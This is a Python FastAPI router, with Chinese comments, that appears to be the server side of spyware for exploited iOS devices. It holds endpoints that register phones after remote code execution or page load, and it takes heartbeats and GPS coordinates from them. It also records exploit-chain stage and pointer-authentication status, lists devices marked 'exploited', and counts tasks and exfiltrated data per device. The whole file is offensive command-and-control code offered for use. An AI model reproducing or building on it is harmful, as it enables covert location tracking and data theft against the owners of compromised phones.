"""设备管理 API 路由"""

from fastapi import APIRouter, Depends, HTTPException, Request
from sqlalchemy.orm import Session
from typing import List

from database import get_db
import crud, schemas

router = APIRouter(prefix="/api/devices", tags=["devices"])


@router.post("/register", response_model=schemas.DeviceOut)
def register_device(data: schemas.DeviceRegister, request: Request, db: Session = Depends(get_db)):
    """
    设备首次注册接入
    在成功 RCE 后或页面加载时调用
    """
    existing = crud.get_device(db, data.device_uuid)
    if existing:
        # 重新注册 = 更新元数据
        existing.device_model = data.device_model or existing.device_model
        existing.ios_version = data.ios_version or existing.ios_version
        existing.chipset = data.chipset or existing.chipset
        existing.user_agent = data.user_agent or existing.user_agent
        existing.ip_address = request.client.host
        existing.status = "online"
        existing.last_seen = __import__("datetime").datetime.utcnow()
        existing.latitude = data.latitude or existing.latitude
        existing.longitude = data.longitude or existing.longitude
        existing.altitude = data.altitude or existing.altitude
        existing.accuracy = data.accuracy or existing.accuracy
        existing.exploit_stage = data.exploit_stage or existing.exploit_stage
        existing.exploit_chain = data.exploit_chain or existing.exploit_chain
        existing.runtime_type = data.runtime_type or existing.runtime_type
        existing.has_pac = data.has_pac if data.has_pac is not None else existing.has_pac
        existing.pac_integrity = data.pac_integrity or existing.pac_integrity
        
        if data.extra:
            if not existing.extra:
                existing.extra = {}
            existing.extra.update(data.extra)
        
        db.commit()
        db.refresh(existing)
        return existing
    
    return crud.create_device(db, data, ip=request.client.host)


@router.post("/heartbeat", response_model=schemas.DeviceOut)
def heartbeat(data: schemas.DeviceHeartbeat, db: Session = Depends(get_db)):
    """
    设备心跳（每30秒上报）
    保持设备在线状态
    """
    device = crud.update_device_heartbeat(db, data)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found, register first")
    return device


@router.post("/location")
def update_location(data: schemas.DeviceLocationUpdate, db: Session = Depends(get_db)):
    """设备报告GPS位置"""
    device = crud.update_device_location(db, data)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    return {"ok": True, "lat": data.latitude, "lng": data.longitude}


@router.post("/exploit_stage")
def update_exploit_stage(device_uuid: str, stage: str, db: Session = Depends(get_db)):
    """更新设备exploit阶段"""
    device = crud.get_device(db, device_uuid)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    device.exploit_stage = stage
    if stage == "completed" and not device.first_exploit_at:
        device.first_exploit_at = __import__("datetime").datetime.utcnow()
        device.status = "exploited"
    
    db.commit()
    db.refresh(device)
    return {"ok": True, "stage": stage}


@router.get("", response_model=List[schemas.DeviceOut])
def list_devices(skip: int = 0, limit: int = 100, status: str = None, db: Session = Depends(get_db)):
    """
    获取所有设备列表
    支持按状态筛选
    """
    if status:
        from sqlalchemy import desc
        devices = db.query(__import__("..models", fromlist=["Device"]).Device).filter(
            __import__("..models", fromlist=["Device"]).Device.status == status
        ).order_by(desc(__import__("..models", fromlist=["Device"]).Device.last_seen)).offset(skip).limit(limit).all()
        return devices
    return crud.get_devices(db, skip=skip, limit=limit)


@router.get("/online", response_model=List[schemas.DeviceOut])
def list_online(db: Session = Depends(get_db)):
    """获取在线设备列表"""
    return crud.get_online_devices(db)


@router.get("/exploited", response_model=List[schemas.DeviceOut])
def list_exploited(db: Session = Depends(get_db)):
    """获取已成功exploit的设备列表"""
    from sqlalchemy import desc
    Device = __import__("..models", fromlist=["Device"]).Device
    return db.query(Device).filter(
        Device.exploit_stage == "completed"
    ).order_by(desc(Device.first_exploit_at)).all()


@router.get("/{device_uuid}", response_model=schemas.DeviceOut)
def get_device(device_uuid: str, db: Session = Depends(get_db)):
    """获取单个设备详情"""
    device = crud.get_device(db, device_uuid)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    return device


@router.get("/{device_uuid}/stats")
def get_device_stats(device_uuid: str, db: Session = Depends(get_db)):
    """获取设备统计数据"""
    device = crud.get_device(db, device_uuid)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    data_counts = crud.get_device_data_counts(db, device_uuid)
    
    return {
        "device": device,
        "data_counts": data_counts,
        "total_tasks": device.total_tasks,
        "completed_tasks": device.completed_tasks,
        "failed_tasks": device.failed_tasks,
        "total_exfil": device.total_exfil
    }


@router.get("/{device_uuid}/logs", response_model=List[schemas.DeviceLogOut])
def get_device_logs(device_uuid: str, skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    """获取设备日志"""
    return crud.get_device_logs(db, device_uuid, skip=skip, limit=limit)


@router.delete("/{device_uuid}")
def delete_device(device_uuid: str, db: Session = Depends(get_db)):
    """删除设备记录"""
    if crud.delete_device(db, device_uuid):
        return {"ok": True, "message": "Device deleted"}
    raise HTTPException(status_code=404, detail="Device not found")


@router.post("/{device_uuid}/notes")
def add_device_notes(device_uuid: str, notes: str, db: Session = Depends(get_db)):
    """添加设备备注"""
    device = crud.get_device(db, device_uuid)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    device.notes = notes
    db.commit()
    db.refresh(device)
    return {"ok": True, "notes": notes}